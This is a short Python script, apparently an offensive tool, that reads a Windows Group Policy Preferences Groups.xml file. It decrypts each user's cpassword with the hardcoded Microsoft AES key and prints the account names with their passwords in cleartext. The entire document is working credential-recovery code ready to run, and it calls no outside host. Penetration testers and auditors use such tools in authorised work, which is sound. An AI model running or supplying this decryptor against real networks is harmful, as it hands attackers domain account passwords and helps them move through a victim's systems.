#!/usr/bin/env python3
import sys
import base64
from xml.etree import ElementTree as ET
from Crypto.Cipher import AES

# Hardcoded Microsoft AES key used to encrypt cpassword values in GPP
KEY = bytes.fromhex(
    '4e9906e8fcb66cc9faf49310620ffee8'
    'f496e806cc057990209b09a433b66c1b'
)

def decrypt_cpassword(cpassword):
    # Fix base64 padding if missing
    missing_padding = len(cpassword) % 4
    if missing_padding:
        cpassword += '=' * (4 - missing_padding)

    # Decode and decrypt the cpassword value using AES-CBC
    encrypted = base64.b64decode(cpassword)
    cipher = AES.new(KEY, AES.MODE_CBC, iv=b'\x00' * 16)
    decrypted = cipher.decrypt(encrypted)
    # Strip null bytes and decode from UTF-16LE
    return decrypted.rstrip(b"\x00").decode("utf-16le")

def parse_xml(path):
    try:
        tree = ET.parse(path)
        root = tree.getroot()
    except Exception as e:
        print(f"[!] Error reading XML file: {e}")
        sys.exit(1)

    # Iterate over each <User> element in the XML
    for user in root.findall(".//User"):
        name = user.get("name")
        props = user.find("Properties")
        if props is not None:
            cpassword = props.get("cpassword")
            if cpassword:
                try:
                    pwd = decrypt_cpassword(cpassword)
                    print(f"[+] {name} : {pwd}")
                except Exception as e:
                    print(f"[!] Decryption error for {name}: {e}")
            else:
                print(f"[!] No cpassword found for {name}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <Groups.xml file path>")
        sys.exit(1)

    parse_xml(sys.argv[1])

